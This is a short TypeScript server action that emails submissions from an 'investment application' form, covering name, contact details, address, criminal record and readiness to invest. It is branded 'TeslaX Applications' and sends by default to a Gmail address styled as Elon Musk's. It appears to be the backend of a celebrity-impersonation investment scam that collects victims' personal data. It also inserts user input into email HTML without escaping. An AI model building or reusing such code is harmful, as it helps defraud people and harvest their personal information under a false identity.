'use server'

import { Resend } from 'resend'

const resend = new Resend(process.env.RESEND_API_KEY)

export type FormState = {
  success: boolean
  error?: string
}

export async function submitApplication(
  _prevState: FormState,
  formData: FormData
): Promise<FormState> {
  const fields = {
    fullName: formData.get('fullName') as string,
    email: formData.get('email') as string,
    phone: formData.get('phone') as string,
    investmentType: formData.get('investmentType') as string,
    address: formData.get('address') as string,
    message: formData.get('message') as string,
    readyToInvest: formData.get('readyToInvest') as string,
    criminalRecord: formData.get('criminalRecord') as string,
  }

  try {
    await resend.emails.send({
      from: 'TeslaX Applications <onboarding@resend.dev>',
      to: process.env.CONTACT_EMAIL! || 'elonreeve.musk.tesla00109@gmail.com',
      subject: `New Investment Application — ${fields.fullName}`,
      html: `
        <h2>New Investment Application</h2>
        <table cellpadding="8" style="border-collapse:collapse;width:100%">
          <tr><td><strong>Full Name</strong></td><td>${fields.fullName}</td></tr>
          <tr><td><strong>Email</strong></td><td>${fields.email}</td></tr>
          <tr><td><strong>Phone</strong></td><td>${fields.phone}</td></tr>
          <tr><td><strong>Investment Type</strong></td><td>${fields.investmentType}</td></tr>
          <tr><td><strong>Address</strong></td><td>${fields.address || '—'}</td></tr>
          <tr><td><strong>Ready to Invest</strong></td><td>${fields.readyToInvest}</td></tr>
          <tr><td><strong>Criminal Record</strong></td><td>${fields.criminalRecord}</td></tr>
          <tr><td><strong>Message</strong></td><td>${fields.message || '—'}</td></tr>
        </table>
      `,
    })

    return { success: true }
  } catch {
    return { success: false, error: 'Failed to send application. Please try again.' }
  }
}
